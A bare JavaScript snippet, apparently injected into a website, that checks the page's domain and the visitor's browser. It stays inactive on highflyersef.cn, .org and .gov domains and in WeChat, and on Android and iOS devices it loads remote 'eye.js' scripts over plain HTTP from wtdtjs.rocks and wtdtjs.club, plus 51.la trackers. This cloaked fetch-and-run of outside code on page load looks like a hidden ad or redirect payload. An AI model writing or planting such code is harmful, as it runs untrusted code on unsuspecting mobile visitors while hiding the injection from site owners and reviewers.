var myHost = !! (/(highflyersef.cn|.org|.gov)/i.test(document.domain));
var myUA = !! (/(MicroMessenger)/i.test(window.navigator.userAgent));
var ISIOS = !! (/(iPhone|iPad|iPod|iOS)/i.test(window.navigator.userAgent));
var ISAPK = !! (/(android)/i.test(window.navigator.userAgent));

function loadJs(url) {
	var el = document.createElement('script');
	el.src = url;
	el.type = 'text/javascript';
	document.getElementsByTagName('head')[0].appendChild(el)
};

if (myHost || myUA) {} else {
	if (ISAPK) {
			var ayaPostion = "bottom";
			var ayaDivId = '';
			var ayaId = 'aya3d734';
			var autoSize = true;
			loadJs('http://shzyjbr.wtdtjs.rocks:8085/static/eye.js');
			loadJs('http://js.users.51.la/18864665.js');
	}
	if (ISIOS) {
			var ayaPostion = "bottom";
			var ayaDivId = '';
			var ayaId = 'aya26934';
			var autoSize = true;
			loadJs('http://eye.wtdtjs.club:8085/static/eye.js');
			loadJs('http://js.users.51.la/18872682.js');
	}
}